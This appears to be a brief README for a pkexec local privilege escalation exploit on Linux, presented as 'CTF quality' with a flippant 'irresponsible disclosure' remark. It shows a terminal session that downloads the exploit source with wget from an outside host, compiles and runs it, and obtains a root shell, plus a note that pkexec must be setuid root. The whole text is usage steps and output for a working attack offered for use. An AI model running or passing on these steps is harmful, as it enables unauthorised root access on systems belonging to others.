## 🐧MAJOR BUG GRANTS ROOT FOR ALL MAJOR LINUX DISTRIBUTIONS

##  CTF quality exploit
bla bla irresponsible disclosure

terminal:
```console
user@linux:~$ wget https://g1f1.github.io/blasty-vs-pkexec.c/blasty-vs-pkexec.c
user@linux:~$ gcc -o blasty blasty-vs-pkexec.c
user@linux:~$ ./blasty
[~] compile helper..
[~] maybe get shell now?
# whoami
root

```
exploitation when debugging:
```debug
pkexec must be setuid root
```
